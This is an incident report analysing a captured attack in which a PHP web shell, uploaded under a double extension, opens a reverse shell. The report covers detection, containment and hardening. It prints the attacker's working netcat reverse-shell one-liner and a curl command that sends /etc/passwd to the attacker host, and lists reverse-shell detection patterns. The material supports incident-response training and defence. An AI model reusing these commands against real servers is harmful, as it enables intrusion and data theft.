Incident Overview

On 03/04/2026 at 9:25am on a public-facing web server, suspicious HTTP activity was identified and captured in a PCAP, 
later confirming an attacker successfully uploaded and executed a malicious PHP web shell. The attacker then established a
reverse shell, attempted to maintain interactive access, and tried to exfiltrate sensitive system information from the server.
​
Executive Summary

An external attacker from Tianjin, China exploited insufficient file upload validation on the company’s reviews feature to deploy 
a PHP web shell named image.jpg.php. Once the web shell was in place, the attacker initiated a reverse shell to their host on port 8080 
and attempted to exfiltrate the /etc/passwd file over HTTP to an external server. Prompt detection and response would have required monitoring 
of anomalous upload activity, outbound reverse-shell-style connections, and suspicious access to sensitive system files.

Timeline of Events

09:25 - Initial reconnaissance and interaction with a web server from IP 117.11.88.124 targeting 24.49.63.79.
09:27 - Failed upload attempt of image.php to /reviews/upload.php blocked as “Invalid file format”.
09:30 - Successful upload of image.jpg.php to /reviews/upload.php, stored under /reviews/uploads/.
09:33 - Execution of the web shell and establishment of a reverse shell from the web server to 117.11.88.124 on TCP port 8080.
09:37 - Execution of commands over the reverse shell, including a curl POST request attempting to send /etc/passwd to http://117.11.88.124:443/.

Technical Analysis

Initial Access and Origin
PCAP analysis in Wireshark showed two main IPs, with 117.11.88.124 acting as the source of suspicious traffic to the web server at 24.49.63.79. 
Using an IP geolocation service, this address was mapped to Tianjin, China, confirming the likely geographic origin of the attack. 
The attacker’s HTTP requests used the User‑Agent string Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0, 
consistent with a Linux-based Firefox client, likely chosen to blend with normal browser traffic.

Exploitation and Web Shell Deployment

The attacker targeted the file upload functionality at /reviews/upload.php. An initial attempt to upload image.php (containing reverse shell PHP code) 
was blocked by server-side validation. The attacker then bypassed this control by renaming the payload to image.jpg.php, 
exploiting weak content validation that relied primarily on file extension checks. The server responded with “File uploaded successfully”, 
and subsequent traffic showed the upload being stored under /reviews/uploads/, confirming the storage location of potentially malicious files.

Command and Control (C2)

The malicious web shell contained PHP code invoking system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f");,
which uses nc (netcat) to create a reverse shell back to the attacker. This established an outbound TCP connection from the victim server to the attacker’s host on port 8080,
providing an interactive shell for remote command execution.

Data Access and Exfiltration Attempt

Filtering the PCAP on tcp.port == 8080 and ip.src == 24.49.63.79 revealed commands executed over the reverse shell, including: curl -X POST -d /etc/passwd http://117.11.88.124:443/
This showed the attacker attempting to POST the contents of /etc/passwd to their external server over HTTPS. 
While /etc/passwd does not normally contain password hashes on modern systems, it exposes valid usernames and system account structure, 
aiding further enumeration and potential privilege escalation.

Impact Assessment

* Confidentiality: Attempted exfiltration of /etc/passwd exposes a list of local users and system information useful for follow-on attacks.
* Integrity: The attacker gained the ability to execute arbitrary commands on the web server, which could be used to modify files or deploy additional malware.
* Availability: No explicit disruption was observed in the PCAP, but the level of access would allow the attacker to degrade or take down the service.

Detection Opportunities

* Unusual POST requests to /reviews/upload.php with executable content or suspicious double extensions (e.g., .jpg.php).
* HTTP access to /reviews/uploads/ that includes executable responses or direct access to recently uploaded files.
* Outbound connections from the web server to untrusted external IPs on non-standard ports (e.g., TCP 8080) consistent with reverse shells.
* Command-line patterns associated with reverse shells (mkfifo, nc, /bin/sh -i) in EDR or process monitoring telemetry.
* Access and network transfer attempts involving /etc/passwd or other sensitive system files.

Response and Containment Recommendations

* Immediately block outbound connections from the web server to 117.11.88.124 and similar high-risk IPs at the firewall or security gateway.
* Remove the image.jpg.php web shell and any other unauthorized content from /reviews/uploads/, and disable or restrict the upload functionality until secured.
* Rotate credentials and review local accounts given the attempted access to /etc/passwd.
* Conduct a broader compromise assessment on the host and surrounding environment to ensure no additional persistence mechanisms were deployed.

Lessons Learned and Hardening

* Enforce strict server-side validation for file uploads: validate MIME types, restrict allowed extensions to a safe allowlist,
and store uploads outside the web root or serve them via a non-executable handler.
* Implement web application firewall (WAF) rules to detect and block uploads of executable content and suspicious filename patterns (e.g., multiple extensions).
* Monitor for reverse-shell indicators and unusual outbound connections from web servers, with alerts for connections to rare ports and newly seen destinations.
* Add logging and alerting around access to sensitive system paths (e.g., /etc/passwd) and outbound data transfers to external IPs.
